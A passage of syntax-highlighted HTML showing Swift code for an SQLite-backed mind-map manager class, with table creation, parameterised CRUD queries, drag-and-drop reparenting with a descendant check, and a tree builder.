class="hljs-type">SQLITE_TRANSIENT</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">unsafeBitCast</span>(<span class="hljs-operator">-</span><span class="hljs-number">1</span>, to: sqlite3_destructor_type.<span class="hljs-keyword">self</span>)<br><br><br><span class="hljs-comment">// MARK: - SQLiteMindMap Manager</span><br><span class="hljs-meta">@MainActor</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SQLiteMindMap</span>: <span class="hljs-title class_ inherited__">ObservableObject</span>  &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> shared <span class="hljs-operator">=</span> <span class="hljs-type">SQLiteMindMap</span>()<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> db: <span class="hljs-type">OpaquePointer</span>?<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> dbQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">&quot;sqlite.mindmap.queue&quot;</span>, qos: .userInitiated)<br><br>    <span class="hljs-comment">// Published flat list and tree</span><br>    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> flatNodes: [<span class="hljs-type">MindMapNode</span>] <span class="hljs-operator">=</span> []<br>    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> tree: [<span class="hljs-type">MindMapTree</span>] <span class="hljs-operator">=</span> []<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> cancellables <span class="hljs-operator">=</span> <span class="hljs-type">Set</span>&lt;<span class="hljs-type">AnyCancellable</span>&gt;()<br><br>    <span class="hljs-comment">// MARK: - Init</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">init</span>() &#123;<br>        <span class="hljs-type">Task</span> &#123;<br>            <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> openDatabase()<br>            <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> createTables()<br>            <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>            setupTreePublisher()<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">deinit</span> &#123;<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> db <span class="hljs-operator">=</span> db &#123;<br>            sqlite3_close(db)<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - DB Setup</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">databaseURL</span>() <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">URL</span> &#123;<br>        <span class="hljs-keyword">try</span> <span class="hljs-type">FileManager</span>.default.url(for: .documentDirectory, in: .userDomainMask, appropriateFor: <span class="hljs-literal">nil</span>, create: <span class="hljs-literal">true</span>)<br>            .appendingPathComponent(<span class="hljs-string">&quot;mindmap.sqlite&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">openDatabase</span>() <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> url <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> databaseURL()<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> localDb: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">if</span> sqlite3_open(url.path, <span class="hljs-operator">&amp;</span>localDb) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    <span class="hljs-keyword">self</span>.db <span class="hljs-operator">=</span> localDb<br>                    <span class="hljs-comment">// enable foreign keys</span><br>                    sqlite3_exec(<span class="hljs-keyword">self</span>.db, <span class="hljs-string">&quot;PRAGMA foreign_keys = ON&quot;</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>)<br>                    cont.resume()<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">let</span> msg <span class="hljs-operator">=</span> localDb.flatMap &#123; <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-variable">$0</span>)) &#125;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.openFailed(message: msg))<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">createTables</span>() <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        BEGIN;</span><br><span class="hljs-string">        CREATE TABLE IF NOT EXISTS mindmap_nodes (</span><br><span class="hljs-string">            id TEXT PRIMARY KEY,</span><br><span class="hljs-string">            parent_id TEXT REFERENCES mindmap_nodes(id) ON DELETE CASCADE,</span><br><span class="hljs-string">            title TEXT NOT NULL,</span><br><span class="hljs-string">            content TEXT,</span><br><span class="hljs-string">            position INTEGER DEFAULT 0,</span><br><span class="hljs-string">            color TEXT,</span><br><span class="hljs-string">            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,</span><br><span class="hljs-string">            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP</span><br><span class="hljs-string">        );</span><br><span class="hljs-string">        CREATE INDEX IF NOT EXISTS idx_parent ON mindmap_nodes(parent_id);</span><br><span class="hljs-string">        COMMIT;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> executeSQL(sql)<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">executeSQL</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">sql</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> err: <span class="hljs-type">UnsafeMutablePointer</span>&lt;<span class="hljs-type">Int8</span>&gt;?<br>                <span class="hljs-keyword">if</span> sqlite3_exec(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, <span class="hljs-operator">&amp;</span>err) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    cont.resume()<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">let</span> msg <span class="hljs-operator">=</span> err.map &#123; <span class="hljs-type">String</span>(cString: <span class="hljs-variable">$0</span>) &#125;<br>                    sqlite3_free(err)<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.queryFailed(message: msg))<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - CRUD (async)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">insertNode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">node</span>: <span class="hljs-type">MindMapNode</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;INSERT INTO mindmap_nodes (id, parent_id, title, content, position, color, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, datetime(&#x27;now&#x27;), datetime(&#x27;now&#x27;));&quot;</span><br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">1</span>, node.id, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> pid <span class="hljs-operator">=</span> node.parentId &#123; sqlite3_bind_text(stmt, <span class="hljs-number">2</span>, pid, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">2</span>) &#125;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">3</span>, node.title, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> c <span class="hljs-operator">=</span> node.content &#123; sqlite3_bind_text(stmt, <span class="hljs-number">4</span>, c, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">4</span>) &#125;<br>                    sqlite3_bind_int(stmt, <span class="hljs-number">5</span>, <span class="hljs-type">Int32</span>(node.position))<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> color <span class="hljs-operator">=</span> node.color &#123; sqlite3_bind_text(stmt, <span class="hljs-number">6</span>, color, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">6</span>) &#125;<br><br>                    <span class="hljs-keyword">if</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_DONE</span> &#123;<br>                        cont.resume()<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">let</span> msg <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))<br>                        cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.insertFailed(message: msg))<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">let</span> msg <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.prepareFailed(message: msg))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateNode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">node</span>: <span class="hljs-type">MindMapNode</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UPDATE mindmap_nodes SET title = ?, content = ?, position = ?, color = ?, updated_at = datetime(&#x27;now&#x27;) WHERE id = ?&quot;</span><br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">1</span>, node.title, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> c <span class="hljs-operator">=</span> node.content &#123; sqlite3_bind_text(stmt, <span class="hljs-number">2</span>, c, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">2</span>) &#125;<br>                    sqlite3_bind_int(stmt, <span class="hljs-number">3</span>, <span class="hljs-type">Int32</span>(node.position))<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> color <span class="hljs-operator">=</span> node.color &#123; sqlite3_bind_text(stmt, <span class="hljs-number">4</span>, color, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">4</span>) &#125;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">5</span>, node.id, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br><br>                    <span class="hljs-keyword">if</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_DONE</span> &#123;<br>                        cont.resume()<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.queryFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.prepareFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">deleteNode</span>(<span class="hljs-params">id</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DELETE FROM mindmap_nodes WHERE id = ?&quot;</span><br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">1</span>, id, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">if</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_DONE</span> &#123;<br>                        cont.resume()<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.deleteFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.prepareFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - Bulk reorder positions</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateNodePositions</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">updates</span>: [(id: <span class="hljs-type">String</span>, position: <span class="hljs-type">Int</span>)]) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>updates.isEmpty <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">return</span> &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UPDATE mindmap_nodes SET position = ?, updated_at = datetime(&#x27;now&#x27;) WHERE id = ?&quot;</span><br>                sqlite3_exec(<span class="hljs-keyword">self</span>.db, <span class="hljs-string">&quot;BEGIN TRANSACTION&quot;</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>)<br>                <span class="hljs-keyword">for</span> (id, pos) <span class="hljs-keyword">in</span> updates &#123;<br>                    <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                        sqlite3_bind_int(stmt, <span class="hljs-number">1</span>, <span class="hljs-type">Int32</span>(pos))<br>                        sqlite3_bind_text(stmt, <span class="hljs-number">2</span>, id, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                        sqlite3_step(stmt)<br>                        sqlite3_reset(stmt)<br>                    &#125;<br>                &#125;<br>                sqlite3_finalize(stmt)<br>                sqlite3_exec(<span class="hljs-keyword">self</span>.db, <span class="hljs-string">&quot;COMMIT&quot;</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>)<br>                cont.resume()<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - Hierarchical Drag &amp; Drop: update parent and position</span><br>    <span class="hljs-comment">/// Move `id` under `newParentId` at given position (position relative to siblings)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateNodeParent</span>(<span class="hljs-params">id</span>: <span class="hljs-type">String</span>, <span class="hljs-params">newParentId</span>: <span class="hljs-type">String</span>?, <span class="hljs-params">position</span>: <span class="hljs-type">Int</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-comment">// Prevent moving under its own descendant</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> newParentId <span class="hljs-operator">=</span> newParentId &#123;<br>            <span class="hljs-keyword">let</span> descendants <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> getSubtreeIds(rootId: id)<br>            <span class="hljs-keyword">if</span> descendants.contains(newParentId) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-type">DatabaseError</span>.queryFailed(message: <span class="hljs-string">&quot;Cannot move node under its own descendant&quot;</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UPDATE mindmap_nodes SET parent_id = ?, position = ?, updated_at = datetime(&#x27;now&#x27;) WHERE id = ?&quot;</span><br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> pid <span class="hljs-operator">=</span> newParentId &#123; sqlite3_bind_text(stmt, <span class="hljs-number">1</span>, pid, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">1</span>) &#125;<br>                    sqlite3_bind_int(stmt, <span class="hljs-number">2</span>, <span class="hljs-type">Int32</span>(position))<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">3</span>, id, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">if</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_DONE</span> &#123;<br>                        cont.resume()<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.queryFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.prepareFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">getSubtreeIds</span>(<span class="hljs-params">rootId</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt; &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;WITH RECURSIVE ids(id) AS (SELECT id FROM mindmap_nodes WHERE id = ? UNION ALL SELECT n.id FROM mindmap_nodes n JOIN ids ON n.parent_id = ids.id) SELECT id FROM ids;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt;, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">var</span> <span class="hljs-keyword">set</span> <span class="hljs-operator">=</span> <span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt;()<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">1</span>, rootId, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">while</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_ROW</span> &#123;<br>                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> text <span class="hljs-operator">=</span> sqlite3_column_text(stmt, <span class="hljs-number">0</span>) &#123; <span class="hljs-keyword">set</span>.insert(<span class="hljs-type">String</span>(cString: text)) &#125;<br>                    &#125;<br>                    cont.resume(returning: <span class="hljs-keyword">set</span>)<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.prepareFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - Refresh &amp; Tree Builder</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">setupTreePublisher</span>() &#123;<br>        <span class="hljs-variable">$flatNodes</span><br>            .map &#123; nodes <span class="hljs-keyword">in</span><br>                <span class="hljs-type">SQLiteMindMap</span>.buildTree(from: nodes)<br>            &#125;<br>            .receive(on: <span class="hljs-type">DispatchQueue</span>.main)<br>            .assign(to: <span class="hljs-operator">&amp;</span><span class="hljs-variable">$tree</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">buildTree</span>(<span class="hljs-params">from</span> <span class="hljs-params">nodes</span>: [<span class="hljs-type">MindMapNode</span>]) -&gt; [<span class="hljs-type">MindMapTree</span>] &#123;<br>        <span class="hljs-keyword">let</span> dict <span class="hljs-operator">=</span> <span class="hljs-type">Dictionary</span>(grouping: nodes, by: &#123; <span class="hljs-variable">$0</span>.parentId &#125;)<br>        <span class="hljs-keyword">func</span> <span class="hljs-title function_">makeSubtree</span>(<span class="hljs-params">parentId</span>: <span class="hljs-type">String</span>?) -&gt; [<span class="hljs-type">MindMapTree</span>] &#123;<br>            <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> children <span class="hljs-operator">=</span> dict[parentId] <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">return</span> [] &#125;<br>            <span class="hljs-keyword">return</span> children.sorted(by: &#123; <span class="hljs-variable">$0</span>.position <span class="hljs-operator">&lt;</span> <span class="hljs-variable">$1</span>.position &#125;).map &#123; node <span class="hljs-keyword">in</span><br>                <span class="hljs-type">MindMapTree</span>(id: node.id, node: node, children: makeSubtree(parentId: node.id))<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> makeSubtree(parentId: <span class="hljs-literal">nil</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">refreshAllNodes</span>() <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT id, parent_id, title, content, position, color, created_at, updated_at FROM mindmap_nodes ORDER BY position&quot;</span><br>        <span class="hljs-keyword">let</span> nodes <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;[<span class="hljs-type">MindMapNode</span>], <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">var</span> arr: [<span class="hljs-type">MindMapNode</span>] <span class="hljs-operator">=</span> []<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    <span class="hljs-keyword">while</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_ROW</span> &#123;<br>                        <span class="hljs-keyword">let</span> id <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(cString: sqlite3_column_text(stmt, <span class="hljs-number">0</span>))<br>                        <span class="hljs-keyword">let</span> pid <span class="hljs-operator">=</span> sqlite3_column_text(stmt, 